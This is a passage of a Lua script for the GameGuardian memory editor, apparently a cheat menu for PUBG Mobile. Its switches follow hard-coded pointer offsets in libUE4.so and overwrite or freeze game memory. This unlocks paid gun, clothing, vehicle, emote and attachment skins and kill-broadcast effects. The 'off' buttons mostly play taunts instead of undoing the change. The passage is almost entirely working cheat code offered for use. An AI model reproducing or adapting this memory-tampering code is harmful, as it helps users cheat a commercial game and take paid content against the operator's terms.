table.insert(tab, _FORV_5_)
end
czdm(tab, el2[1])
end
end,
			
							function()

toMusic('做梦去吧，你别想关')---语音
end),
changan.switch("自改播报",
function()				
jr = gg.prompt({"AKM华丽浮雕击杀播报 1101001042 AKM怒海争锋击杀播报1101001063 AKM白虎咆哮击杀播报 1101001068 AKM冰霜核心击杀播报 1101001089 AKM积木龙骨击杀播报1101001103 AKM奇异之夜击杀播报 1101001116 AKM金牌海盗击杀播报 1101001143 AKM吉利龙王击杀播报 1101001128 AKM奇幻工坊击杀播报 1101001154 AKM部落之王击杀播报1101001174 AKM星海提督击杀播报 1101001213 AKM俏皮兔宝击杀播报 1101001231M16A4血风暴击杀播报1101002029 M16A4极光脉冲击杀播报 1101002056 M16A4缤纷利刃击杀播报 1101002068 M16A4猩红血月击杀播报 1101002081M16A4古堡龙卫击杀播报1101002103死噶梦幻水枪击杀播报 1101003057死噶魔法南瓜击杀播报1101003070死噶翌日行动击杀播报 1101003080 死噶诡秘之夜击杀播报 1101003099 死噶魔力结晶击杀播报 1101003119死噶邪能植物击杀播报 1101003146 死噶血魂魔皇击杀播报 1101003167M416冰霜核心击杀播报1101004046 M416愚人小丑击杀播报 1101004062M416异域游者击杀播报 1101004078 M416萌龙咆哮击杀播报1101004086M416野性呼唤击杀播报 1101004098 M416科技核心击杀播报 1101004138 M416潮鸣宫廷击杀播报 1101004163 M416庇护之潮击杀播报1101004209Groza幻夜音乐击杀播报1101005025 Groza绚烂之战1101005043 Groza冥河烈焰1101005052AUG流浪马戏团 1101006033 AUG第四使徒 1101006044 QBZ极致绝杀 1101007036 QBZ瑰绮灵姬1101007046 M762比特宝莉 1101008026妹控星云力量"},nil,{"number"})
	if jr ~= nil then


local t = {"libUE4.so:bss", "Cb"}
local tt = {0x1AB90,0x10,0x220,0x78,0x0,0x300+8}
local ttt = S_Pointer(t, tt, true)
gg.addListItems({{address = ttt, flags = 4, value = jr[1], freeze = true}})
toMusic("开启成功")
end
end,
							function()

toMusic('做梦去吧，你别想关')---语音
end),
changan.switch("手持打击特效",
function()				
local t = {"libUE4.so:bss", "Cb"}
local tt = {0x3ABD8,0x0,0x1A0,0x0,0x6B8,0x3D8,0x18,0x8C}
local ttt = S_Pointer(t, tt, true)
gg.addListItems({{address = ttt, flags = 4, value = 1101004046, freeze = true}})
toMusic("开启成功")
end,
			
							function()

toMusic('做梦去吧，你别想关')---语音
end),
changan.switch("枪械DIY",
function()				
local cfg_file = "/sdcard/息白/0手持枪械配置.txt"
	local chunk = loadfile(cfg_file)
	local cfg = nil
	if chunk ~= nil then
	cfg = chunk()
	end
	if cfg == nil then
	cfg = {1101004046,true}
	end

QC =gg.prompt({
"AKM:\n华丽浮雕 1101001042 怒海争锋 1101001063 白虎咆哮 1101001068 冰霜核心 1101001089 积木龙骨 1101001103 奇异之夜 1101001116 金牌海盗 1101001143 吉利龙王 1101001128 奇幻工坊 1101001154 部落之王 1101001174 星海提督 1101001213 俏皮兔宝 1101001231\n以下为M16A4:\n血骸风暴 1101002029 极光脉冲 1101002056 缤纷利刃 1101002068 猩红血月 1101002081 古堡龙卫 1101002103\n以下为死嘎:\n梦幻水枪 1101003057 魔法南瓜 1101003070 翌日行动 1101003080 诡秘之夜 1101003099 魔力结晶 1101003119 邪能植物 1101003146 血魂魔皇 1101003167\n以下为M416:\n冰霜核心 1101004046 愚人小丑 1101004062 异域游荡者 1101004078 萌龙咆哮 1101004086 野性呼唤 1101004098 科技核心 1101004138 潮鸣宫廷 1101004163 庇护之潮 1101004209\n以下为狗杂:\n幻夜音乐 1101005025 绚烂之战 1101005043 冥河烈焰 1101005052\n以下为AUG\n流浪马戏团 1101006033 第四使徒 1101006044 \n以下为QBZ:\n极致绝杀 1101007036 瑰绮灵姬 1101007046 M762比特宝莉 1101008026 \n妹控星云力量 1103007020",
	},cfg,{"text"})
	if QC == nil then else
		gg.saveVariable(QC, cfg_file)
		if QC[1] == true then TX() end
local t = {"libUE4.so:bss", "Cb"}
local tt = {0x3AD38,0x0,0xDD0,0x60,0x9B8,0x11C}
--libUE4.so:bss+0x3AD38+0x0+0x1A0+0x0+0x9B8+0x11C
local ttt = S_Pointer(t, tt, true)
gg.addListItems({{address = ttt, flags = 4, value = QC[1], freeze = true}})--枪械皮肤
toMusic("开启成功")
end
end,
			
							function()

toMusic('做梦去吧，你别想关')---语音
end),
changan.switch("衣服美化",
function()				
local UE4 = gg.getRangesList("libUE4.so")
    if not UE4 or #UE4 == 0 then
        os.exit()
    end
    local base_pointer = readPointer('libUE4.so', {0xC5AFD38,0x0,0x390,0x90,0x388,0x0}, 1)
    local pointers = {
		[1] = {pointer = base_pointer + 0x3C, name = "脸部"},
		[2] = {pointer = base_pointer + 0x74, name = "头发"},
		[3] = {pointer = base_pointer + 0x11C, name = "衣服"},
		[4] = {pointer = base_pointer + 0x154, name = "裤子"},
		[5] = {pointer = base_pointer + 0x18C, name = "鞋子"},
		[6] = {pointer = base_pointer + 0x1C4, name = "背包"},
		[7] = {pointer = base_pointer + 0x1FC, name = "头盔"}
    }
    local config_path = "/storage/emulated/0/共享配置文件夹/PUBG局内衣服配置.ini"
    local config_data = loadfile(config_path)
    local config = config_data and config_data()
    if not config or #config == 0 then
        config = {40604012,0,1404133,1404134,1400127,1501003261,1502002027,true}
    end
    
    local values = {}
    local names = {}
    
    for i, p in ipairs(pointers) do
        table.insert(names, p.name.."代码:")
        table.insert(values, config[i])
    end
    
    table.insert(names, "是否修改背包和头盔")
    table.insert(values, config[8])

    local options = gg.prompt(names, values, {"number", "number", "number", "number", "number", "number", "number", "checkbox"})

    if options then
    ----更新tg@YSYMHNB

    ----更新tg@YSYMHNB
        gg.saveVariable(options, config_path)
        
        for i, p in ipairs(pointers) do        
            if i==6 or i==7 or options[i]==""then else
            gg.edits(p.pointer-4, {{options[i], 4, 0}}, p.name)
            end
        end
        
        if options[8] then
        if options[6]==""then else
            gg.edits(pointers[6].pointer-4, {{options[6], 4, 0}}, pointers[6].name)
            end
        if options[7]==""then else
            gg.edits(pointers[7].pointer-4, {{options[7], 4, 0}}, pointers[7].name)
           end
        end
        
    end
end,
function()

toMusic('关闭成功')---语音
end),
changan.switch("载具美化",
function()				
gg.setConfig("冻结间隔", 0)
gg.setConfig("快速冻结", 1)
local cfg_file = gg.EXT_FILES_DIR.."/"..gg.getFile():match("[^/]+$")..'(载具.).lua'
local chunk = loadfile(cfg_file)
local cfg = nil
if chunk ~= nil then
 cfg = chunk()
end
if cfg == nil then
cfg = {1908085,1908085,1908085,1908085,1908085,1908085,1908085, true}
end
hui = gg.prompt({
"摩托修改:",
"轿车修改:",
"大巴修改",
"吉普修改:",
"皮卡修改:",
"带顶修改",
"吉普修改",
},cfg,{"text","text","text", "text","text","text","text"})
if hui == nil then else
gg.saveVariable(hui, cfg_file)
if hui[1] == true then huinb1() end
if hui[2] == true then huinb2() end
if hui[3] == true then huinb3() end
if hui[4] == true then huinb4() end
if hui[5] == true then huinb5() end
if hui[6] == true then huinb6() end
if hui[7] == true then huinb7() end


a=0x0
while(a <=0xAB0)
do
a=a+0x10
mk=gg.getRangesList('libUE4.so')[1].start
add = RUI(RUI(RUI(RUI(RUI(mk + 0xC656D90) + 0x558) + a) + 0x30) + 0x38)
adpd = RUI(RUI(RUI(RUI(RUI(RUI(mk + 0xC656D90) + 0x558) + a) + 0x30) + 0x38) +0x8) +0x18
if readD(adpd) == 1000 then
gg.alert("遍历完成")
addListltems(add,4,0,false)
break
add=add
end
end

SK=0x6EF60
while(SK <=0x501314)
do
SK=SK+0x18
addr=RUI(add+SK)
if readD(addr) == 18 or readD(addr) == 0 then

if readD(addr+0x58) == 1901001 then
setvalue(addr+0x18,4,hui[1])
end
if readD(addr+0x58) == 1903001 then
setvalue(addr+0x18,4,hui[2])
end
if readD(addr+0x58) == 1904001 then
setvalue(addr+0x18,4,hui[3])
end
if readD(addr+0x58) == 1908001 then
setvalue(addr+0x18,4,hui[4])
end
if readD(addr+0x58) == 1905001 then
setvalue(addr+0x18,4,hui[5])
end
if readD(addr+0x58) == 1906001 then
setvalue(addr+0x18,4,hui[6])
end
if readD(addr+0x58) == 1908001 then
setvalue(addr+0x18,4,hui[7])
toMusic("开启成功")
break
end
end
end
end
end,						
function()

toMusic('人才')---语音
end),
changan.switch("自改动作",
function()				
gg.setConfig("冻结间隔", 0)
gg.setConfig("快速冻结", 1)
local cfg_file = gg.EXT_FILES_DIR.."/"..gg.getFile():match("[^/]+$")..'(动作美化.).lua'
local chunk = loadfile(cfg_file)
local cfg = nil
if chunk ~= nil then
 cfg = chunk()
end if cfg == nil then
cfg = {
12219502,12219619,2201201,true}
end
qing = gg.prompt({
"地狱正午动作",
"蓝色木乃伊动作",
"鼓掌",
},cfg,{

"text",
"text",
"text",
})
if qing == nil then else
gg.saveVariable(qing, cfg_file)
if qing[1] == true then xsnb1() end
a=0x0
while(a <=0xAF0)
do
a=a+0x10
mk=gg.getRangesList('libUE4.so')[1].start
add = RUI(RUI(RUI(RUI(RUI(mk + 0xC656D90) + 0x558) + a) + 0x30) + 0x38)--动态DD900
adpd = RUI(RUI(RUI(RUI(RUI(mk + 0xC656D90) + 0x558) + a) + 0x30) + 0x30) +0x18
if readD(adpd) == 1000 then
addListltems(add,4,0,false)
--5x3000
--2.9 101001锁链0xDD900+0x558+0x10+0x30+0x30+0x0(0x18就直接到101,001,100)


break
add=add
end
end

nmsl=0x4148-----4148 7500
while(nmsl <=0x866E218)
do
nmsl=nmsl+0x18
addr=RUI(add+nmsl)
if readD(addr+0x58) == 2200101 then --AKM
setvalue(addr+0x18,4,qing[1])
end

if readD(addr+0x58) == 2200201 then --AKM
setvalue(addr+0x18,4,qing[2])
end

if readD(addr+0x58) == 2200301 then --AKM
setvalue(addr+0x18,4,qing[3])
toMusic('开启成功')
break
end
end
end
end,
function()

toMusic('人才')---语音
end),
changan.text("自改枪械美化专区","#00FF00","10sp"),--空文本可用于换行，sp调整距离
changan.switch("枪械美化",
function()		
local cfg_file = "/sdcard/息白/枪械美化配置.ini"
local chunk = loadfile(cfg_file)
local cfg = nil
if chunk ~= nil then
cfg = chunk()
end
if cfg == nil then
cfg = {
1101001213--ak
, 1101002029--m16
, 1101003146--sc
, 1101004046--m416
, 1101005055--GROZA
, 1101006033--AUG
, 10100700--QBZ
, 1101008081--M762
, 1101009011--mk47
, 1101010012--g36c
, 10101200--蜜罐11
, 1102001024--UZI12
, 1102002061--UMP45
, 1102003080--Vector
, 1102004018--汤姆逊
, 1102005007--野牛
, 10200600--MP5K
, 1102105002--P90
, 1103001154--98K
, 1103002018--m24
, 1103003022--awm
, 1103004037--sks22
, 1103005024--vss23
, 10300600--mini14
, 1103007020--mk1425
, 1103008014--win94
, 10300900--slr27
, 10301000--QBU
, 1103011001--莫辛纳甘
, 1103012010--amr
, 10301300--m417
, 1104001027--s686
, 1104002022--s189
, 1104003031--s12k
, 1104004021--dbs
, 1105001020--m249
, 1105002035--大盘鸡
, 1105010008--mg3
, 1108001057--大砍刀
, 1108002046--撬棍
, 1108003001--镰刀
, 1108004009--平底锅
, 1010042029--红点
, 1010042028--全息瞄准键
, 1010042027--2倍镜
, 1010042026--3倍镜
, 1010042025--4倍镜
, 1010042024--6被
, 1030020242--八倍
, 1010040462--m4苗具
, 1010040461--m4枪托
, 1010040463--m4弹夹
, true}
end
QiuCi = gg.prompt({
"AKM美化代码:",--1
"M16A4美化代码:",--2
"SCAR-L美化代码:",--3
"M416美化代码:",--4
"GROZA美化代码:",--5
"AUG美化代码:",--6
"QBZ美化代码:",--7
"M762美化代码:",--8
"MK47美化代码:",--9
"G36C美化代码:",--10
"蜜罐美化代码:",--11
"UZI美化代码:",--12
"UMP45美化代码:",--13
"Vector美化代码:",--14
"汤姆逊美化代码:",--15
"野牛美化代码:",--16
"MP5K美化代码:",--17
"P90美化代码:",--18
"98K美化代码:",--19
"M24美化代码:",--20
"AWM美化代码:",--21
"SKS美化代码:",--22
"VSS美化代码:",--23
"Mini14美化代码:",--24
"Mk14美化代码:",--25
"Win94美化代码:",--26
"SLR美化代码:",--27
"QBU美化代码:",--28-
"莫辛纳甘美化代码:",--29
"AMR美化代码:",--30
"M417美化代码:",--31
"S686美化代码:",--32
"S1897代码:",--33
"S12K美化代码:",--34
"DBS美化代码:",--35
"M249美化代码:",--36
"大盘鸡美化代码:",--37
"MG3美化代码:",--38
"大砍刀美化代码:",--39
"撬棍美化代码:",--40
"镰刀美化代码:",--41
"平底锅美化代码:",--42
"红点瞄准镜美化代码:",--43
"全息瞄准镜美化代码:",--44
"二倍瞄准镜美化代码:",--45
"三倍瞄准镜美化代码:",--46
"四倍瞄准镜美化代码:",--47
"六倍瞄准镜美化代码:",--48
"八倍瞄准镜美化代码:",--49
"M4瞄具美化代码:",--50
"M4枪托美化代码:",--51
"M4弹夹美化代码:",--52
},cfg,{
"text",--1
"text",--2
"text",--3
"text",--4
"text",--5
"text",--6
"text",--7
"text",--8
"text",--9
"text",--10
"text",--11
"text",--12
"text",--13
"text",--14
"text",--15
"text",--16
"text",--17
"text",--18
"text",--19
"text",--20
"text",--21
"text",--22
"text",--23
"text",--24
"text",--25
"text",--26
"text",--27
"text",--28
"text",--29
"text",--30
"text",--31
"text",--32
"text",--33
"text",--34
"text",--35
"text",--36
"text",--37
"text",--38
"text",--39
"text",--40
"text",--41
"text",--42
"text",--43
"text",--44
"text",--45
"text",--46
"text",--47
"text",--48
"text",--49
"text",--50
"text",--52
"text"--53
})
if QiuCi == nil then else
gg.saveVariable(QiuCi, cfg_file)
if QiuCi[1] == true then QiuCi1() end
if QiuCi[2] == true then QiuCi2() end
if QiuCi[3] == true then QiuCi3() end
if QiuCi[4] == true then QiuCi4() end
if QiuCi[5] == true then QiuCi5() end
if QiuCi[6] == true then QiuCi6() end
if QiuCi[7] == true then QiuCi7() end
if QiuCi[8] == true then QiuCi8() end
if QiuCi[9] == true then QiuCi9() end
if QiuCi[10] == true then QiuCi10() end
if QiuCi[11] == true then QiuCi11() end
if QiuCi[12] == true then QiuCi12() end
if QiuCi[13] == true then QiuCi13() end
if QiuCi[14] == true then QiuCi14() end
if QiuCi[15] == true then QiuCi15() end
if QiuCi[16] == true then QiuCi16() end
if QiuCi[17] == true then QiuCi17() end
if QiuCi[18] == true then QiuCi18() end
if QiuCi[19] == true then QiuCi19() end
if QiuCi[20] == true then QiuCi20() end
if QiuCi[21] == true then QiuCi21() end
if QiuCi[22] == true then QiuCi22() end
if QiuCi[23] == true then QiuCi23() end
if QiuCi[24] == true then QiuCi24() end
if QiuCi[25] == true then QiuCi25() end
if QiuCi[26] == true then QiuCi26() end
if QiuCi[27] == true then QiuCi27() end
if QiuCi[28] == true then QiuCi28() end
if QiuCi[29] == true then QiuCi29() end
if QiuCi[30] == true then QiuCi30() end
if QiuCi[31] == true then QiuCi31() end
if QiuCi[32] == true then QiuCi32() end
if QiuCi[33] == true then QiuCi33() end
if QiuCi[34] == true then QiuCi34() end
if QiuCi[35] == true then QiuCi35() end
if QiuCi[36] == true then QiuCi36() end
if QiuCi[37] == true then QiuCi37() end
if QiuCi[38] == true then QiuCi38() end
if QiuCi[39] == true then QiuCi39() end
if QiuCi[40] == true then QiuCi40() end
if QiuCi[41] == true then QiuCi41() end
if QiuCi[42] == true then QiuCi42() end
if QiuCi[43] == true then QiuCi43() end
if QiuCi[44] == true then QiuCi44() end
if QiuCi[45] == true then QiuCi45() end
if QiuCi[46] == true then QiuCi46() end
if QiuCi[47] == true then QiuCi47() end
if QiuCi[48] == true then QiuCi48() end
if QiuCi[49] == true then QiuCi49() end
if QiuCi[50] == true then QiuCi50() end
if QiuCi[51] == true then QiuCi51() end
if QiuCi[52] == true then QiuCi52() end

a=0x0
while(a <=0xAF0)
do
a=a+0x10
mk=gg.getRangesList('libUE4.so')[1].start
add = RUI(RUI(RUI(RUI(RUI(mk + 0xC656D90) + 0x558) + a) + 0x30) + 0x38)--动态DD900
adpd = RUI(RUI(RUI(RUI(RUI(mk + 0xC656D90) + 0x558) + a) + 0x30) + 0x30) +0x18
if readD(adpd) == 1000 then
--5x3000
--2.9 101001锁链0xDD900+0x558+0x10+0x30+0x30+0x0(0x18就直接到101,001,100)


break
add=add
end
end

nmsl=0x4148--0x3FF8初始 0x5000 0x4148 0x7500
while(nmsl <=0x866E218)--10850最大
do
nmsl=nmsl+0x18
addr=RUI(add+nmsl)



if readD(addr+0x58) == 101001 then--AKM
setvalue(addr+0x18,4,QiuCi[1])
gg.toast("修改目标:AKM")
end
if readD(addr+0x58) == 101002 then--M16A4
setvalue(addr+0x18,4,QiuCi[2])
gg.toast("修改目标:M16A4")
end
if readD(addr+0x58) == 101003 then--SCAR
setvalue(addr+0x18,4,QiuCi[3])
gg.toast("修改目标:SCAR")
end
if readD(addr+0x58) == 101004 then--M416
setvalue(addr+0x18,4,QiuCi[4])
gg.toast("修改目标:M416")
end
if readD(addr+0x58) == 101005 then --GROZA
setvalue(addr+0x18,4,QiuCi[5])
gg.toast("修改目标:GROZA")
end
if readD(addr+0x58) == 101006 then --AUG
setvalue(addr+0x18,4,QiuCi[6])
gg.toast("修改目标:AUG")
end
if readD(addr+0x58) == 101007 then--QBZ
setvalue(addr+0x18,4,QiuCi[7])
gg.toast("修改目标:QBZ")
end
if readD(addr+0x58) == 101008 then--M762
setvalue(addr+0x18,4,QiuCi[8])
gg.toast("修改目标:M762")
end
if readD(addr+0x58) == 101009 then--MK47
setvalue(addr+0x18,4,QiuCi[9])
gg.toast("修改目标:MK47")
end
if readD(addr+0x58) == 101010 then--G36C
setvalue(addr+0x18,4,QiuCi[10])
gg.toast("修改目标:G36C")
end
if readD(addr+0x58) == 101012 then--蜜罐
setvalue(addr+0x18,4,QiuCi[11])
gg.toast("修改目标:蜜罐")
end
if readD(addr+0x58) == 102001 then--UZI
setvalue(addr+0x18,4,QiuCi[12])
gg.toast("修改目标:UZI")
end
if readD(addr+0x58) == 102002 then--UMP45
setvalue(addr+0x18,4,QiuCi[13])
gg.toast("修改目标:UMP45")
end
if readD(addr+0x58) == 102003 then--Vector
setvalue(addr+0x18,4,QiuCi[14])
gg.toast("修改目标:Vector")
end
if readD(addr+0x58) == 102004 then--汤姆逊
setvalue(addr+0x18,4,QiuCi[15])
gg.toast("修改目标:汤姆逊")
end
if readD(addr+0x58) == 102005 then--野牛
setvalue(addr+0x18,4,QiuCi[16])
gg.toast("修改目标:野牛")
end
if readD(addr+0x58) == 102006 then--MP5K
setvalue(addr+0x18,4,QiuCi[17])
gg.toast("修改目标:MP5K")
end
if readD(addr+0x58) == 102007 then--P90
setvalue(addr+0x18,4,QiuCi[18])
gg.toast("修改目标:P90")
end
if readD(addr+0x58) == 103001 then--98K
setvalue(addr+0x18,4,QiuCi[19])
gg.toast("修改目标:98K")
end
if readD(addr+0x58) == 103002 then--M24
setvalue(addr+0x18,4,QiuCi[20])
gg.toast("修改目标:M24")
end
if readD(addr+0x58) == 103003 then--awm
setvalue(addr+0x18,4,QiuCi[21])
gg.toast("修改目标:AWM")
end
if readD(addr+0x58) == 103004 then--SKS
setvalue(addr+0x18,4,QiuCi[22])
gg.toast("修改目标:SKS")
end
if readD(addr+0x58) == 103005 then--VSS
setvalue(addr+0x18,4,QiuCi[23])
gg.toast("修改目标:VSS")
end
if readD(addr+0x58) == 103006 then--Mini14
setvalue(addr+0x18,4,QiuCi[24])
gg.toast("修改目标:MINI14")
end
if readD(addr+0x58) == 103007 then--MK14
setvalue(addr+0x18,4,QiuCi[25])
gg.toast("修改目标:MK14")
end
if readD(addr+0x58) == 103008 then--Win94
setvalue(addr+0x18,4,QiuCi[26])
gg.toast("修改目标:Win94")
end
if readD(addr+0x58) == 103009 then--SLR
setvalue(addr+0x18,4,QiuCi[27])
gg.toast("修改目标:SLR")
end
if readD(addr+0x58) == 103010 then--QBU
setvalue(addr+0x18,4,QiuCi[28])
gg.toast("修改目标:QBU")
end
if readD(addr+0x58) == 103011 then--莫辛纳甘
setvalue(addr+0x18,4,QiuCi[29])
gg.toast("修改目标:莫辛纳甘")
end
if readD(addr+0x58) == 103012 then--AMR
setvalue(addr+0x18,4,QiuCi[30])
gg.toast("修改目标:AMR")
end
if readD(addr+0x58) == 103013 then--M417
setvalue(addr+0x18,4,QiuCi[31])
gg.toast("修改目标:M417")
end
if readD(addr+0x58) == 104001 then--S686
setvalue(addr+0x18,4,QiuCi[32])
gg.toast("修改目标:S686")
end
if readD(addr+0x58) == 104002 then--S1897
setvalue(addr+0x18,4,QiuCi[33])
gg.toast("修改目标:S1897")
end
if readD(addr+0x58) == 104003 then--S12K
setvalue(addr+0x18,4,QiuCi[34])
gg.toast("修改目标:S12K")
end
if readD(addr+0x58) == 104004 then--DBS
setvalue(addr+0x18,4,QiuCi[35])
gg.toast("修改目标:DBS")
end
if readD(addr+0x58) == 105001 then--M249
setvalue(addr+0x18,4,QiuCi[36])
gg.toast("修改目标:M249")
end
if readD(addr+0x58) == 105002 then--大盘鸡
setvalue(addr+0x18,4,QiuCi[37])
gg.toast("修改目标:大盘鸡")
end
if readD(addr+0x58) == 105010 then--MG3
setvalue(addr+0x18,4,QiuCi[38])
gg.toast("修改目标:MG3")
end
if readD(addr+0x58) == 108001 then--大砍刀
setvalue(addr+0x18,4,QiuCi[39])
gg.toast("修改目标:砍刀")
end
if readD(addr+0x58) == 108002 then--撬棍
setvalue(addr+0x18,4,QiuCi[40])
gg.toast("修改目标:撬棍")
end
if readD(addr+0x58) == 108003 then--镰刀
setvalue(addr+0x18,4,QiuCi[41])
gg.toast("修改目标:镰刀")
end
if readD(addr+0x58) == 108004 then--平底锅
setvalue(addr+0x18,4,QiuCi[42])
gg.toast("修改目标:平底锅")
end
if readD(addr+0x58) == 203001 then--红点
setvalue(addr+0x18,4,QiuCi[43])
gg.toast("修改目标:红点瞄准器")
end
if readD(addr+0x58) == 203002 then--全息
setvalue(addr+0x18,4,QiuCi[44])
gg.toast("修改目标:全息瞄准器")
end
if readD(addr+0x58) == 203003 then--二倍
setvalue(addr+0x18,4,QiuCi[45])
gg.toast("修改目标:二倍瞄准器")
end
if readD(addr+0x58) == 203006 then--三倍
setvalue(addr+0x18,4,QiuCi[46])
gg.toast("修改目标:三倍瞄准器")
end
if readD(addr+0x58) == 203004 then--四倍
setvalue(addr+0x18,4,QiuCi[47])
gg.toast("修改目标:四倍瞄准器")
end
if readD(addr+0x58) == 203007 then--六倍
setvalue(addr+0x18,4,QiuCi[48])
gg.toast("修改目标:六倍瞄准器")
end
if readD(addr+0x58) == 203005 then--八倍
setvalue(addr+0x18,4,QiuCi[49])
gg.toast("修改目标:8倍瞄准器")
end
if readD(addr+0x58) == 203008 then--m4瞄具
setvalue(addr+0x18,4,QiuCi[50])
gg.toast("修改目标M416鸡苗:")
end
if readD(addr+0x58) == 205005 then--m4张托
setvalue(addr+0x18,4,QiuCi[51])
gg.toast("修改目标:M416枪托")
end
if readD(addr+0x58) == 291004 then --m4弹夹
setvalue(addr+0x18,4,QiuCi[52])
gg.toast("修改目标:M416弹夹")
string.toMusic('开启成功')
break
end
end
end
end,
function()
string.toMusic('无法关闭')				
end),
changan.switch("狙击枪美化",
function()		
local cfg_file = gg.EXT_FILES_DIR.."/"..gg.getFile():match("[^/]+$")..'(狙击.).lua'
local chunk = loadfile(cfg_file)
local cfg = nil
if chunk ~= nil then
 cfg = chunk()
end
if cfg == nil then
cfg = {1103001060,1103002030,1103003022,1103004037,1103005024,1103006030,1103007020,1103008014,1103011001,1103003062,1104001018,1104002022,1104003026,1104004013,1105001034,1108002027,1108004283, true}
end
hu = gg.prompt({
"98K修改:",--1
"M24修改:",--2
"AWM修改",--3
"SKS修改:",--4
"VSS修改:",--5
"Mini修改",--6
"Mk14修改",--7
"Wi94修改",--8
"莫辛狙击修改",--9
"AWR修改",--10
"S686修改",
"S1897修改",
"S12K修改",
"DBS修改",--14
"M249修改",--15
"撬棍修改",--16
"平底锅修改",--17
},cfg,{"text","text","text", "text","text","text","text","text", "text","text","text","text","text","text","text","text","text"})
if hu == nil then else
gg.saveVariable(hu, cfg_file)
if hu[1] == true then hunb1() end
if hu[2] == true then hunb2() end
if hu[3] == true then hunb3() end
if hu[4] == true then hunb4() end
if hu[5] == true then hunb5() end
if hu[6] == true then hunb6() end
if hu[7] == true then hunb7() end
if hu[8] == true then hunb8() end
if hu[9] == true then hunb9() end
if hu[10] == true then hunb10() end
if hu[11] == true then hunb11() end
if hu[12] == true then hunb12() end
if hu[13] == true then hunb13() end
if hu[14] == true then hunb14() end
if hu[15] == true then hunb15() end
if hu[16] == true then hunb16() end
if hu[17] == true then hunb17() end

a=0x0
while(a <=0xAB0)
do
a=a+0x10
mk=gg.getRangesList('libUE4.so')[1].start
add = RUI(RUI(RUI(RUI(RUI(mk + 0xC656D90) + 0x558) + a) + 0x30) + 0x38)
adpd = RUI(RUI(RUI(RUI(RUI(RUI(mk + 0xC656D90) + 0x558) + a) + 0x30) + 0x38) +0x8) +0x18
if readD(adpd) == 1000 then
gg.alert("遍历完成")
addListltems(add,4,0,false)
break
add=add
end
end

SK=0x3FF8
while(SK <=0x866E218)
do
SK=SK+0x18
addr=RUI(add+SK)


if readD(addr) == 18 or readD(addr) == 0 then
if readD(addr+0x58) == 103001 then
setvalue(addr+0x18,4,hu[1])
addListltems(add,4,0,false)

end
if readD(addr+0x58) == 103002 then
setvalue(addr+0x18,4,hu[2])
addListltems(add,4,0,false)

end
if readD(addr+0x58) == 103003 then
setvalue(addr+0x18,4,hu[3])
addListltems(add,4,0,false)

end
if readD(addr+0x58) == 103004 then
setvalue(addr+0x18,4,hu[4])

end
if readD(addr+0x58) == 103005 then
setvalue(addr+0x18,4,hu[5])

end
if readD(addr+0x58) == 103006 then
setvalue(addr+0x18,4,hu[6])

end
if readD(addr+0x58) == 103007 then
setvalue(addr+0x18,4,hu[7])

end
if readD(addr+0x58) == 103008 then
setvalue(addr+0x18,4,hu[8])

end
if readD(addr+0x58) == 103011 then
setvalue(addr+0x18,4,hu[9])

end
if readD(addr+0x58) == 103012 then
setvalue(addr+0x18,4,hu[10])

end
if readD(addr+0x58) == 104001 then
setvalue(addr+0x18,4,hu[11])

end
if readD(addr+0x58) == 104002 then
setvalue(addr+0x18,4,hu[12])

end
if readD(addr+0x58) == 104003 then
setvalue(addr+0x18,4,hu[13])

end
if readD(addr+0x58) == 104004 then
setvalue(addr+0x18,4,hu[14])

end
if readD(addr+0x58) == 105001 then 
setvalue(addr+0x18,4,hu[15])

end
if readD(addr+0x58) == 108002 then 
setvalue(addr+0x18,4,hu[16])

end
if readD(addr+0x58) == 108004 then 
setvalue(addr+0x18,4,hu[17])
string.toMusic('开启成功')
break
end
end
end
end
end,
function()
string.toMusic('无法关闭')				
end),
changan.text("配件美化专区","#00FF00","10sp"),--空文本可用于换行，sp调整距离
changan.switch("配件美化",
function()		
local cfg_file = "/sdcard/配件美化配置/.txt"
	local chunk = loadfile(cfg_file)
	local cfg = nil
	if chunk ~= nil then
		cfg = chunk()
	end
	if cfg == nil then
cfg = {
1030020812,
1010081218,
1010040466,
1010040467,
1010040468,
1010040469,
1010040470,
1010040471,
1010040472,
1010040473,
1010040474,
1010040475,
1010040476,
1010040477,
1010040478,
1010040479,
1010040480,
true}
end
qing = gg.prompt({


"8倍瞄准镜",
"6倍瞄准镜",
"4倍瞄准镜",
"3倍瞄准镜",
"2倍瞄准镜",
"全息瞄准镜",
"红点瞄准镜",
"扩容弹夹",
"快速弹夹",
"快速扩容弹夹",
"消焰器",
"枪口补偿器",
"消音器",
"直角前握把",
"拇指握把",
"垂直握把",
"战术枪托",
},cfg,{


"text",
"text",
"text",
"text",
"text",
"text",
"text",
"text",
"text",
"text",
"text",
"text",
"text",
"text",
"text",
"text",
"text"})
if qing == nil then else
gg.saveVariable(qing, cfg_file)
if qing[1] == true then qing1() end
if qing[2] == true then qing2() end
if qing[3] == true then qing3() end
if qing[4] == true then qing4() end
if qing[5] == true then qing5() end
if qing[6] == true then qing6() end
if qing[7] == true then qing7() end
if qing[8] == true then qing8() end
if qing[9] == true then qing9() end
if qing[10] == true then qing10() end
if qing[11] == true then qing11() end
if qing[12] == true then qing12() end
if qing[13] == true then qing13() end
if qing[14] == true then qing14() end
if qing[15] == true then qing15() end
if qing[16] == true then qing16() end
if qing[17] == true then qing17() end
a=0x0
while(a <=0xAF0)
do
a=a+0x10
mk=gg.getRangesList('libUE4.so')[1].start
add = RUI(RUI(RUI(RUI(RUI(mk + 0xC656D90) + 0x558) + a) + 0x30) + 0x38)--动态DD900
adpd = RUI(RUI(RUI(RUI(RUI(mk + 0xC656D90) + 0x558) + a) + 0x30) + 0x30) +0x18
if readD(adpd) == 1000 then
--5x3000
--2.9 101001锁链0xDD900+0x558+0x10+0x30+0x30+0x0(0x18就直接到101,001,100)


break
add=add
end
end

nmsl=0x4148--3FF8初始
while(nmsl <=0x866E218)--10850最大
do
nmsl=nmsl+0x18
addr=RUI(add+nmsl)
if readD(addr+0x58) == 203005 then --AKM
setvalue(addr+0x18,4,qing[1])

end
if readD(addr+0x58) == 203015 then --AKM
setvalue(addr+0x18,4,qing[2])

end
if readD(addr+0x58) == 203004 then --AKM
setvalue(addr+0x18,4,qing[3])

end
if readD(addr+0x58) == 203014 then --AKM
setvalue(addr+0x18,4,qing[4])

end
if readD(addr+0x58) == 203003 then --AKM
setvalue(addr+0x18,4,qing[5])

end
if readD(addr+0x58) == 203002 then --AKM
setvalue(addr+0x18,4,qing[6])

end
if readD(addr+0x58) == 203001 then --AKM
setvalue(addr+0x18,4,qing[7])

end
if readD(addr+0x58) == 204011 then --AKM1
setvalue(addr+0x18,4,qing[8])

end
if readD(addr+0x58) == 204012 then --AKM
